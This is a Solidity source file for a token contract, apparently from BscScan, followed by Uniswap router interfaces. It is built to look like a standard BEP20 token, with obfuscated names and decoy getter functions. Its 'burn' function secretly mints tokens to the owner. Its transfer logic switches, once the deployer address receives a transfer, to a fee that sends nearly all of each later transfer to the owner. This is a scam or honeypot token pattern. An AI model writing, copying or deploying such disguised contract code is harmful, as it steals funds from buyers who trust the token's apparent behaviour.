/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.1;
contract uGBqvs {
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  CmmrNS = address(0);
uint8 public constant decimals = 18;
string public  symbol = "uGBqvs";
uint256 private  dqyoWZ = 10000000000000;
uint256 private  ObcNWM = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  yRaqQJ = address(0);
string public  name = "uGBqvs";
address private  fkArbN = address(0);
uint256 private  gqJhsp = 10000000000;
address private  dghByI = address(0);
address public owner;
address private  caQtbt = address(0);
uint256 public constant iTqmgT = 99999;
uint256 private  KQnDyg = 100000000;
address private  BeuIxF = address(0);
address private  ebxLjP = address(0);
uint256 private  tuUaUd = 1000000000000000000;
address private  MEuMbr = address(0);
mapping (address => uint256) public balanceOf;
address private  LZKbPD = address(0);
uint256 private  HqsXXW = 1000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  SuZAlV = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
function _getMEuMbr() private returns (address) {
return MEuMbr;
}

function _getKQnDyg() private returns (uint256) {
return KQnDyg;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XtCCPy");
require(to != address(0), "XtCCPy");
require(amount <= balanceOf[from], "XtCCPy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* iTqmgT/SuZAlV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==caQtbt){
SuZAlV = iTqmgT+2;
}
emit Transfer(from, to, transferAmount);
}
function _getdqyoWZ() private returns (uint256) {
return dqyoWZ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}




function _getCmmrNS() private returns (address) {
return CmmrNS;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tXtCCPy 0");
require(spender != address(0), "fXtCCPy 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


constructor () public {
caQtbt = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getLZKbPD() private returns (address) {
return LZKbPD;
}

function _getObcNWM() private returns (uint256) {
return ObcNWM;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getfkArbN() private returns (address) {
return fkArbN;
}

function _getebxLjP() private returns (address) {
return ebxLjP;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getHqsXXW() private returns (uint256) {
return HqsXXW;
}

function _getgqJhsp() private returns (uint256) {
return gqJhsp;
}





function _getdghByI() private returns (address) {
return dghByI;
}



function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
///////////////////////////////////////////////////////////
interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

}